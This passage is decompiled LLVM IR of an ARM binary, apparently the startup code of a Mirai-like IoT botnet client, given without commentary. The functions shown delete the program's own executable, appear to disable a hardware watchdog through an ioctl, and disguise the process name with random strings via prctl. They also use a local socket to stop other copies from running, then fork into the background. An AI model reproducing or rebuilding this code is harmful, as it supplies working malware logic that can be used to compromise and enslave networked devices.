  %v0_fcb0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fcb0

dec_label_pc_ff80:                                ; preds = %dec_label_pc_fd5c.backedge, %dec_label_pc_fcd4
  %v1_ff84 = call i32 @function_13070(i32 12)
  %v1_ff8c = call i32 @function_13070(i32 13)
  %v1_ff94 = call i32 @function_13070(i32 14)
  %v1_ff9c = call i32 @function_13070(i32 15)
  %v1_ffa4 = call i32 @function_13070(i32 16)
  %v1_ffac = call i32 @close(i32 %v4_fcc4)
  br label %dec_label_pc_ff3c

; uselistorder directives
  uselistorder i32 %v1_fee4., { 1, 0 }
  uselistorder i1 %v9_fee0, { 1, 0 }
  uselistorder i32 %v0_fee4, { 1, 0 }
  uselistorder i32 %v1_feb0., { 1, 0 }
  uselistorder i1 %v9_feac, { 1, 0 }
  uselistorder i32 %v0_feb0, { 1, 0 }
  uselistorder i32 %v1_fe7c., { 1, 0 }
  uselistorder i1 %v9_fe78, { 1, 0 }
  uselistorder i32 %v0_fe7c, { 1, 0 }
  uselistorder i32 %v1_fe48., { 1, 0 }
  uselistorder i1 %v9_fe44, { 1, 0 }
  uselistorder i32 %v0_fe48, { 1, 0 }
  uselistorder i32 %v1_fe14., { 1, 2, 0 }
  uselistorder i1 %v9_fe10, { 1, 0 }
  uselistorder i32 %v0_fe14, { 1, 0 }
  uselistorder i32 %v0_fe20, { 1, 0 }
  uselistorder i32 %v4_fd68, { 1, 0 }
  uselistorder i32 %v4_fcc4, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v4_fca0, { 1, 2, 0 }
  uselistorder i32 %v1_fa70, { 1, 0 }
  uselistorder i32 %stack_var_-8420.1.be, { 1, 0 }
  uselistorder i32 %v3_fbe8, { 1, 2, 0 }
  uselistorder i32 %v1_faf0, { 1, 0 }
  uselistorder i32 %v1_faa0, { 0, 1, 5, 4, 3, 2, 7, 8, 6 }
  uselistorder i32 %v5_fa58, { 1, 0 }
  uselistorder i32 %stack_var_-8420.0, { 1, 0 }
  uselistorder i32 %v2_fb88, { 1, 0, 2 }
  uselistorder i32 %v2_fb38, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_fa04, { 1, 0 }
  uselistorder i32 %v4_f9d0, { 2, 0, 1 }
  uselistorder i32 %v3_f980, { 1, 0 }
  uselistorder i32 %v2_f974, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_f900, { 1, 0 }
  uselistorder i32 %v3_f8b0, { 1, 0 }
  uselistorder i32 %storemerge173, { 1, 0 }
  uselistorder i32 %v0_f840, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %stack_var_-8408, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %sl.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 17, 5, 4, 16, 3, 2, 6, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 42, 41, 43, 44, 45, 1, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 64, { 6, 10, 7, 11, 12, 13, 8, 14, 15, 16, 0, 17, 18, 19, 20, 1, 21, 22, 23, 9, 24, 25, 26, 2, 27, 28, 29, 3, 30, 31, 32, 33, 34, 4, 35, 36, 37, 38, 39, 5, 40, 41 }
  uselistorder i32 (%__dirstream*)* @closedir, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @_readdir, { 7, 8, 0, 6, 5, 4, 2, 3, 1 }
  uselistorder %__dirstream* (i8*)* @opendir, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @_readlink, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1cdf8.160, { 1, 0, 2, 3 }
  uselistorder i32 4096, { 5, 9, 1, 2, 6, 7, 0, 8, 3, 4 }
  uselistorder label %dec_label_pc_ff3c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ff00, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fd74, { 1, 0 }
  uselistorder label %dec_label_pc_fcb8, { 1, 0 }
  uselistorder label %dec_label_pc_fcb0, { 1, 0 }
  uselistorder label %dec_label_pc_fa6c.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_fc54, { 1, 0 }
  uselistorder label %dec_label_pc_fa7c, { 1, 0 }
  uselistorder label %dec_label_pc_fa7c.preheader, { 1, 0 }
  uselistorder label %bb215, { 1, 0 }
  uselistorder label %dec_label_pc_f92c, { 1, 0 }
  uselistorder label %dec_label_pc_f8dc, { 1, 0 }
}

define i32 @function_ffc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_ffc0:
  store i32 ptrtoint (i32* @global_var_10148.162 to i32), i32* @global_var_1cd54.164, align 4
  %v1_ffcc = load i32, i32* @r0, align 4
  ret i32 %v1_ffcc
}

define i32 @function_ffd8() local_unnamed_addr {
dec_label_pc_ffd8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_ffd8 = load i32, i32* @r4, align 4
  %v9_ffd8 = load i32, i32* @r6, align 4
  %v15_ffd8 = load i32, i32* @r8, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v3_fff4 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1cd4c.166 to i32), i32* @r6, align 4
  %v7_fffc = icmp eq i32 %v3_fff4, -1
  store i32 %v3_fff4, i32* @global_var_1cd4c.166, align 4
  br i1 %v7_fffc, label %dec_label_pc_100bc, label %dec_label_pc_10008

dec_label_pc_10008:                               ; preds = %dec_label_pc_ffd8
  %v0_1001c = call i32 @_setsockopt()
  %v2_10020 = load i32, i32* @global_var_1cd4c.166, align 4
  store i32 %v2_10020, i32* %r4.global-to-local, align 4
  %v2_10030 = call i32 (i32, i32, ...) @fcntl(i32 %v2_10020, i32 3)
  %v2_10040 = call i32 (i32, i32, ...) @fcntl(i32 %v2_10020, i32 4)
  store i32 ptrtoint (i8** @global_var_1cd58.168 to i32), i32* @r8, align 4
  %v2_10048 = load i8, i8* bitcast (i8** @global_var_1cd58.168 to i8*), align 4
  %v2_1004c = icmp eq i8 %v2_10048, 0
  br i1 %v2_1004c, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_10008
  br label %bb

.thread:                                          ; preds = %dec_label_pc_10008
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_10084 = call i32* @__errno_location()
  %v2_10084 = ptrtoint i32* %v0_10084 to i32
  %v0_10088 = load i32, i32* @r5, align 4
  store i32 %v0_10088, i32* %v0_10084, align 4
  %v2_1008c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1008c, i32* @r7, align 4
  store i32 %v2_10084, i32* %r4.global-to-local, align 4
  %v0_100a0 = call i32 @_bind()
  %v7_100a4 = icmp eq i32 %v0_100a0, -1
  br i1 %v7_100a4, label %dec_label_pc_100c4, label %dec_label_pc_100ac

dec_label_pc_100ac:                               ; preds = %bb
  %v2_100b4 = load i32, i32* @global_var_1cd4c.166, align 4
  %v2_100b8 = call i32 @listen(i32 %v2_100b4, i32 1)
  br label %dec_label_pc_100bc

dec_label_pc_100bc:                               ; preds = %dec_label_pc_ffd8, %dec_label_pc_100d0, %dec_label_pc_100ac
  %v20_100c0 = phi i32 [ %v3_fff4, %dec_label_pc_ffd8 ], [ %v0_10120, %dec_label_pc_100d0 ], [ %v2_100b8, %dec_label_pc_100ac ]
  store i32 %v3_ffd8, i32* @r4, align 4
  store i32 %v9_ffd8, i32* @r6, align 4
  store i32 %v15_ffd8, i32* @r8, align 4
  ret i32 %v20_100c0

dec_label_pc_100c4:                               ; preds = %bb
  %v0_100c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100c4 = inttoptr i32 %v0_100c4 to i32*
  %v2_100c4 = load i32, i32* %v1_100c4, align 4
  %v7_100c8 = icmp eq i32 %v2_100c4, 99
  br i1 %v7_100c8, label %dec_label_pc_10128, label %dec_label_pc_100d0

dec_label_pc_100d0:                               ; preds = %dec_label_pc_10128, %bb21, %dec_label_pc_100c4
  store i32 %v2_1008c, i32* @r1, align 4
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_100e8 = load i32, i32* @global_var_1cd4c.166, align 4
  store i32 %v2_100e8, i32* @r0, align 4
  %v3_10100 = call i32 @_connect(i32 %v2_100e8, i32 %v2_1008c, i32 16)
  %v1_10108 = call i32 @_sleep(i32 5)
  %v2_1010c = load i32, i32* @global_var_1cd4c.166, align 4
  %v1_10110 = call i32 @close(i32 %v2_1010c)
  %v1_1011c = call i32 @function_f2bc(i32 58811)
  %v0_10120 = call i32 @function_ffd8()
  br label %dec_label_pc_100bc

dec_label_pc_10128:                               ; preds = %dec_label_pc_100c4
  %v2_10128 = load i8, i8* bitcast (i8** @global_var_1cd58.168 to i8*), align 4
  %v3_10128 = zext i8 %v2_10128 to i32
  %v1_1012c = load i32, i32* @r5, align 4
  %v9_1012c = icmp eq i32 %v3_10128, %v1_1012c
  br i1 %v9_1012c, label %dec_label_pc_100d0, label %bb21

bb21:                                             ; preds = %dec_label_pc_10128
  %v2_10134 = trunc i32 %v1_1012c to i8
  store i8 %v2_10134, i8* bitcast (i8** @global_var_1cd58.168 to i8*), align 4
  br label %dec_label_pc_100d0

; uselistorder directives
  uselistorder i32 %v3_fff4, { 1, 2, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_f2bc, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 2, 0, 1, 3 }
  uselistorder i32 ()* @_bind, { 3, 2, 1, 0, 4 }
  uselistorder i8* bitcast (i8** @global_var_1cd58.168 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1cd58.168, { 1, 0 }
  uselistorder label %dec_label_pc_100d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100bc, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_10148() local_unnamed_addr {
dec_label_pc_10148:
  %stack_var_-16 = alloca i32, align 4
  %v3_10148 = load i32, i32* @r4, align 4
  store i32 %v3_10148, i32* %stack_var_-16, align 4
  %v1_10150 = call i32 @function_13128(i32 3)
  %v3_1015c = call i32 @function_13044(i32 3, i32* null)
  %v1_10160 = inttoptr i32 %v3_1015c to i8*
  %v2_10160 = call i32 @function_10ebc(i8* %v1_10160)
  store i32 %v2_10160, i32* @r5, align 4
  %v1_1016c = call i32 @function_13070(i32 3)
  %v0_10170 = load i32, i32* @r5, align 4
  %v2_10170 = icmp eq i32 %v0_10170, 0
  br i1 %v2_10170, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_10148
  ret i32 %v1_1016c

bb5:                                              ; preds = %dec_label_pc_10148
  %v1_1017c = add i32 %v0_10170, 4
  %v2_1017c = inttoptr i32 %v1_1017c to i32*
  %v3_1017c = load i32, i32* %v2_1017c, align 4
  store i32 %v3_1017c, i32* @r4, align 4
  %v0_10180 = call i32 @function_10bd8()
  %v0_10184 = load i32, i32* @r5, align 4
  %v1_10184 = inttoptr i32 %v0_10184 to i8*
  %v2_10184 = load i8, i8* %v1_10184, align 1
  %v3_10184 = zext i8 %v2_10184 to i32
  %v2_10188 = urem i32 %v0_10180, %v3_10184
  %v0_1018c = load i32, i32* @r4, align 4
  %v4_1018c = mul nuw nsw i32 %v2_10188, 4
  %v5_1018c = add i32 %v0_1018c, %v4_1018c
  %v6_1018c = inttoptr i32 %v5_1018c to i32*
  %v7_1018c = load i32, i32* %v6_1018c, align 4
  store i32 %v7_1018c, i32* @global_var_1ce04.172, align 4
  %v2_10198 = inttoptr i32 %v0_10184 to i32*
  %v3_10198 = call i32 @function_10e98(i32* %v2_10198, i32 %v3_10184)
  %v1_101a0 = call i32 @function_13128(i32 4)
  %v3_101ac = call i32 @function_13044(i32 4, i32* null)
  %v4_101ac = inttoptr i32 %v3_101ac to i8*
  %v2_101b0 = add i32 %v3_101ac, 1
  %v3_101b0 = inttoptr i32 %v2_101b0 to i8*
  %v4_101b0 = load i8, i8* %v3_101b0, align 1
  %v3_101b4 = load i8, i8* %v4_101ac, align 1
  store i8 %v4_101b0, i8* bitcast (i32* @global_var_1ce03.173 to i8*), align 4
  store i8 %v3_101b4, i8* bitcast (i32* @global_var_1ce02.174 to i8*), align 4
  %v2_101cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_101cc, i32* @r4, align 4
  %v1_101d0 = call i32 @function_13070(i32 4)
  %v0_101d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_101d4, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  br label %bb7

bb7:                                              ; preds = %bb5, %bb6
  ret i32 %v1_101d0

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_101d8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_101d8:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp13 = call i8 @__decompiler_undefined_function_1()
  %tmp19 = call i8 @__decompiler_undefined_function_1()
  %tmp23 = call i8 @__decompiler_undefined_function_1()
  %tmp27 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i8 @__decompiler_undefined_function_1()
  %tmp35 = call i8 @__decompiler_undefined_function_1()
  %tmp37 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1616 = alloca i32, align 4
  %stack_var_-38 = alloca i8, align 1
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-592 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-170 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-106 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-464 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_101d8 = load i32, i32* @r4, align 4
  store i32 %v3_101d8, i32* %stack_var_-36, align 4
  %v6_101d8 = load i32, i32* @r5, align 4
  %v2_101e8 = ptrtoint i32* %stack_var_-464 to i32
  store i32 %v2_101e8, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_101f0 = load i32, i32* %arg2, align 4
  %v3_101f0 = inttoptr i32 %v2_101f0 to i8*
  store i32 %tmp, i32* @r6, align 4
  %v3_101f8 = call i32 @unlink(i8* %v3_101f0)
  %v1_10200 = call i32 @_sigemptyset(i32 %v2_101e8)
  %v2_1020c = call i32 @_sigaddset(i32 %v2_101e8, i32 2)
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_1021c = call i32 @sigprocmask(i32 %v2_101e8, %_TYPEDEF_sigset_t* null, %_TYPEDEF_sigset_t* null)
  %v4_10228 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i32 1 to void (i32)*))
  %v4_10234 = call void (i32)* @signal(i32 5, void (i32)* bitcast (void (i32)** @global_var_ffc0.176 to void (i32)*))
  %v4_10240 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_14408.178, i32 0, i32 0), i32 2)
  %v7_10244 = icmp eq i32 %v4_10240, -1
  store i32 %v4_10240, i32* @r4, align 4
  br i1 %v7_10244, label %dec_label_pc_105c8, label %dec_label_pc_10250

dec_label_pc_10250:                               ; preds = %dec_label_pc_105c8, %dec_label_pc_101d8
  %v0_10264 = phi i32 [ %v4_105d0, %dec_label_pc_105c8 ], [ %v4_10240, %dec_label_pc_101d8 ]
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10268 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10268, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v5_10270 = call i32 @_ioctl(i32 %v0_10264, i32 -2147199228, i32 %v2_10268, i32 1, i32 1)
  %v0_10274 = load i32, i32* @r4, align 4
  %v1_10278 = call i32 @close(i32 %v0_10274)
  br label %dec_label_pc_1027c

dec_label_pc_1027c:                               ; preds = %dec_label_pc_105c8, %dec_label_pc_10250
  %v0_10280 = call i32 @_chdir()
  %v0_10284 = call i32 @function_13d0c()
  store i32 ptrtoint (i32* @global_var_1cdf4.141 to i32), i32* @fp, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_102a0 = ptrtoint i8* %stack_var_-106 to i32
  store i32 2, i32* @r7, align 4
  store i8 80, i8* bitcast (i32* @global_var_1ce03.173 to i8*), align 4
  store i32 902487617, i32* @global_var_1ce04.172, align 4
  store i8 0, i8* bitcast (i32* @global_var_1ce02.174 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1ce01.183 to i8*), align 4
  store i32 %v0_10284, i32* @global_var_1cdf4.141, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i8 2, i8* bitcast (i8** @global_var_1ce00.171 to i8*), align 4
  %v0_102cc = load i32, i32* @r6, align 4
  %v1_102cc = inttoptr i32 %v0_102cc to i32*
  %v2_102cc = load i32, i32* %v1_102cc, align 4
  store i32 %v2_102cc, i32* @r5, align 4
  %v4_102d0 = call i32 @_memcpy(i32 %v2_102a0, i32 ptrtoint ([3 x i8]* @global_var_1445c.185 to i32), i32 18)
  store i32 ptrtoint (i32* @global_var_14458.200 to i32), i32* @r4, align 4
  store i32 add (i32 add (i32 ptrtoint (i32* @global_var_13070.195 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_ffd8.188 to i32), i32 ptrtoint (i32* @global_var_13128.190 to i32)), i32 77892), i32 ptrtoint (i32* @global_var_131e0.193 to i32))), i32 162052), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (void (i32)** @global_var_ffc0.176 to i32), i32* %r2.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_13070.195 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_ffd8.188 to i32), i32 ptrtoint (i32* @global_var_13128.190 to i32)), i32 77892), i32 ptrtoint (i32* @global_var_131e0.193 to i32))), i32 162052), i32 0), label %dec_label_pc_104cc, label %dec_label_pc_10338

dec_label_pc_10338:                               ; preds = %dec_label_pc_1027c
  %v3_10338 = load i8, i8* %stack_var_-106, align 1
  %v4_10338 = sext i8 %v3_10338 to i32
  store i32 %v4_10338, i32* %r2.global-to-local, align 4
  %v4_1033c = zext i8 %tmp37 to i32
  store i32 %v4_1033c, i32* %r3.global-to-local, align 4
  %v0_10340 = load i32, i32* @r5, align 4
  store i8 %tmp37, i8* %stack_var_-72, align 1
  %v1_1034c = inttoptr i32 %v0_10340 to i8*
  %v2_1034c = call i32 @function_13a54(i8* %v1_1034c)
  %v0_10354 = load i32, i32* @r7, align 4
  %v2_10358 = srem i32 %v0_10354, %v2_1034c
  %v4_1035c = zext i8 %tmp35 to i32
  store i32 %v4_1035c, i32* %r2.global-to-local, align 4
  %v4_10360 = zext i8 %tmp34 to i32
  store i32 %v4_10360, i32* %r3.global-to-local, align 4
  %v0_10364 = load i32, i32* @r5, align 4
  %v2_10364 = add i32 %v0_10364, %v2_10358
  %v3_10364 = inttoptr i32 %v2_10364 to i8*
  %v4_10364 = load i8, i8* %v3_10364, align 1
  %v6_10364 = zext i8 %v4_10364 to i32
  store i32 %v6_10364, i32* %r4.global-to-local, align 4
  %v1_10374 = inttoptr i32 %v0_10364 to i8*
  %v2_10374 = call i32 @function_13a54(i8* %v1_10374)
  %v2_10380 = srem i32 4, %v2_10374
  %v0_10384 = load i32, i32* %r4.global-to-local, align 4
  %v1_10384 = sub i32 -1, %v0_10384
  store i32 %v1_10384, i32* %r4.global-to-local, align 4
  %v0_10388 = load i32, i32* @r5, align 4
  %v2_10388 = add i32 %v0_10388, %v2_10380
  %v3_10388 = inttoptr i32 %v2_10388 to i8*
  %v4_10388 = load i8, i8* %v3_10388, align 1
  %v6_10388 = zext i8 %v4_10388 to i32
  %v4_1038c = zext i8 %tmp31 to i32
  store i32 %v4_1038c, i32* %r2.global-to-local, align 4
  %v1_10394 = sub i32 -82, %v0_10384
  %v1_10398 = sub nuw nsw i32 -1, %v6_10388
  store i32 %v1_10398, i32* %r3.global-to-local, align 4
  %v1_103a0 = urem i32 %v1_10394, 256
  %v2_103a4 = add nsw i32 %v1_103a0, %v1_10398
  store i32 %v2_103a4, i32* %r4.global-to-local, align 4
  %v1_103b0 = inttoptr i32 %v0_10388 to i8*
  %v2_103b0 = call i32 @function_13a54(i8* %v1_103b0)
  %v2_103bc = srem i32 6, %v2_103b0
  %v0_103c0 = load i32, i32* @r5, align 4
  %v2_103c0 = add i32 %v0_103c0, %v2_103bc
  %v3_103c0 = inttoptr i32 %v2_103c0 to i8*
  %v4_103c0 = load i8, i8* %v3_103c0, align 1
  %v6_103c0 = zext i8 %v4_103c0 to i32
  %v4_103c4 = zext i8 %tmp27 to i32
  store i32 %v4_103c4, i32* %r2.global-to-local, align 4
  %v1_103cc = sub nuw nsw i32 -1, %v6_103c0
  store i32 %v1_103cc, i32* %r3.global-to-local, align 4
  %v0_103d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_103d4 = urem i32 %v0_103d4, 256
  %v2_103d8 = add nsw i32 %v1_103d4, %v1_103cc
  store i32 %v2_103d8, i32* %r4.global-to-local, align 4
  %v1_103e4 = inttoptr i32 %v0_103c0 to i8*
  %v2_103e4 = call i32 @function_13a54(i8* %v1_103e4)
  %v2_103f0 = srem i32 8, %v2_103e4
  %v0_103f4 = load i32, i32* @r5, align 4
  %v2_103f4 = add i32 %v0_103f4, %v2_103f0
  %v3_103f4 = inttoptr i32 %v2_103f4 to i8*
  %v4_103f4 = load i8, i8* %v3_103f4, align 1
  %v6_103f4 = zext i8 %v4_103f4 to i32
  %v4_103f8 = zext i8 %tmp23 to i32
  store i32 %v4_103f8, i32* %r2.global-to-local, align 4
  %v1_10400 = sub nuw nsw i32 -1, %v6_103f4
  store i32 %v1_10400, i32* %r3.global-to-local, align 4
  %v0_10408 = load i32, i32* %r4.global-to-local, align 4
  %v1_10408 = urem i32 %v0_10408, 256
  %v2_1040c = add nsw i32 %v1_10408, %v1_10400
  store i32 %v2_1040c, i32* %r4.global-to-local, align 4
  %v1_10418 = inttoptr i32 %v0_103f4 to i8*
  %v2_10418 = call i32 @function_13a54(i8* %v1_10418)
  %v2_10424 = srem i32 10, %v2_10418
  %v0_10428 = load i32, i32* @r5, align 4
  %v2_10428 = add i32 %v0_10428, %v2_10424
  %v3_10428 = inttoptr i32 %v2_10428 to i8*
  %v4_10428 = load i8, i8* %v3_10428, align 1
  %v6_10428 = zext i8 %v4_10428 to i32
  %v4_1042c = zext i8 %tmp19 to i32
  store i32 %v4_1042c, i32* %r2.global-to-local, align 4
  %v1_10434 = sub nuw nsw i32 -1, %v6_10428
  store i32 %v1_10434, i32* %r3.global-to-local, align 4
  %v0_1043c = load i32, i32* %r4.global-to-local, align 4
  %v1_1043c = urem i32 %v0_1043c, 256
  %v2_10440 = add nsw i32 %v1_1043c, %v1_10434
  store i32 %v2_10440, i32* %r4.global-to-local, align 4
  %v1_1044c = inttoptr i32 %v0_10428 to i8*
  %v2_1044c = call i32 @function_13a54(i8* %v1_1044c)
  %v2_10458 = srem i32 12, %v2_1044c
  %v0_1045c = load i32, i32* @r5, align 4
  %v2_1045c = add i32 %v0_1045c, %v2_10458
  %v3_1045c = inttoptr i32 %v2_1045c to i8*
  %v4_1045c = load i8, i8* %v3_1045c, align 1
  %v6_1045c = zext i8 %v4_1045c to i32
  %v0_10460 = load i32, i32* %r4.global-to-local, align 4
  %v1_10464 = sub nuw nsw i32 -1, %v6_1045c
  store i32 %v1_10464, i32* %r3.global-to-local, align 4
  %fold = add i32 %v0_10460, %v1_10464
  %v1_10470 = urem i32 %fold, 256
  %v2_10474 = urem i32 %v1_10470, 9
  %v1_10478 = load i32, i32* @r7, align 4
  %v6_10478 = shl i32 %v2_10474, %v1_10478
  %v2_10480 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10480, i32* %r2.global-to-local, align 4
  %v1_10484 = and i32 %v6_10478, 1020
  %v2_1048c = add i32 %v1_10484, %v2_10480
  %v2_10490 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_10490, i32* @r4, align 4
  %v1_10498 = add i32 %v2_1048c, -172
  %v2_10498 = inttoptr i32 %v1_10498 to i32*
  %v3_10498 = load i32, i32* %v2_10498, align 4
  call void @__pseudo_branch(i32 %v3_10498)
  %v0_1049c = load i32, i32* @r5, align 4
  %v2_104a4 = inttoptr i32 %v0_1049c to i8*
  %v3_104a4 = call i32 @function_13e34(i8* %v2_104a4, i32 %v2_10490)
  store i32 %v3_104a4, i32* @r5, align 4
  %v2_104b4 = call i32 @function_13af4(i32 %v2_102a0, i32 18)
  %v2_104c0 = call i32 @function_13af4(i32 %v2_10490, i32 12)
  %v0_104c4 = load i32, i32* @r5, align 4
  %v1_104c4 = urem i32 %v0_104c4, 256
  %v2_104c4 = icmp eq i32 %v1_104c4, 0
  br i1 %v2_104c4, label %dec_label_pc_104cc, label %dec_label_pc_105e4

dec_label_pc_104cc:                               ; preds = %dec_label_pc_10338, %dec_label_pc_1027c, %dec_label_pc_105e4
  %v2_104d0 = ptrtoint i32* %stack_var_-138 to i32
  store i32 %v2_104d0, i32* @sl, align 4
  %v0_104d4 = call i32 @function_ffd8()
  %v1_104d8 = call i32 @function_10c30(i32 %v0_104d4)
  %v2_104e4 = call i32 @function_13af4(i32 %v2_104d0, i32 32)
  %v0_104e8 = load i32, i32* @r8, align 4
  %v7_104e8 = icmp eq i32 %v0_104e8, 2
  br i1 %v7_104e8, label %dec_label_pc_105f0, label %dec_label_pc_104f0

dec_label_pc_104f0:                               ; preds = %dec_label_pc_105f0, %dec_label_pc_104cc, %dec_label_pc_10600
  %v0_104f0 = call i32 @function_10bd8()
  %v1_104f4 = mul i32 %v0_104f0, 4
  %v3_104f8 = and i32 %v1_104f4, 12
  %v2_10500 = ptrtoint i32* %stack_var_-170 to i32
  store i32 %v2_10500, i32* @r5, align 4
  %v1_10504 = add nuw nsw i32 %v3_104f8, 12
  store i32 %v1_10504, i32* @r4, align 4
  %v2_10510 = call i32 @function_10c8c(i32 %v2_10500, i32 %v1_10504)
  %v2_10518 = ptrtoint i32* %stack_var_-36 to i32
  %v1_1051c = load i32, i32* @r4, align 4
  %v2_1051c = add i32 %v1_1051c, %v2_10518
  store i32 %v2_1051c, i32* %r3.global-to-local, align 4
  %v0_10520 = load i32, i32* @r6, align 4
  %v1_10520 = inttoptr i32 %v0_10520 to i32*
  %v2_10520 = load i32, i32* %v1_10520, align 4
  store i32 %v2_10520, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
  %v3_10528 = add i32 %v2_1051c, -134
  %v4_10528 = inttoptr i32 %v3_10528 to i8*
  store i8 0, i8* %v4_10528, align 1
  %v2_10530 = inttoptr i32 %v2_10520 to i8*
  %v3_10530 = call i32 @function_13a7c(i8* %v2_10530, i32 %v2_10500)
  %v0_10534 = call i32 @function_10bd8()
  %v2_1053c = urem i32 %v0_10534, 6
  %v3_10540 = mul nuw nsw i32 %v2_1053c, 4
  %v1_10544 = add nuw nsw i32 %v3_10540, 12
  store i32 %v1_10544, i32* @r4, align 4
  %v2_10550 = call i32 @function_10c8c(i32 %v2_10500, i32 %v1_10544)
  store i32 %v2_10518, i32* %r2.global-to-local, align 4
  %v1_1055c = load i32, i32* @r4, align 4
  %v2_1055c = add i32 %v1_1055c, %v2_10518
  store i32 %v2_1055c, i32* %r3.global-to-local, align 4
  %v0_10560 = load i32, i32* @r6, align 4
  %v1_10560 = trunc i32 %v0_10560 to i8
  %v3_10560 = add i32 %v2_1055c, -134
  %v4_10560 = inttoptr i32 %v3_10560 to i8*
  store i8 %v1_10560, i8* %v4_10560, align 1
  %v4_1056c = call i32 @_prctl(i32 15, i32 %v2_10500, i32 %v2_10518, i32 %v2_1055c)
  %v1_10574 = call i32 @function_13128(i32 2)
  %v3_10580 = call i32 @function_13044(i32 2, i32* nonnull %stack_var_-44)
  %v3_10584 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10584, i32* %r2.global-to-local, align 4
  store i32 %v3_10580, i32* @r1, align 4
  store i32 1, i32* @r0, align 4
  %v0_10590 = call i32 @_write()
  store i32 1, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1442c.202 to i32), i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_105a0 = call i32 @_write()
  %v1_105a8 = call i32 @function_13070(i32 2)
  %v0_105ac = call i32 @fork()
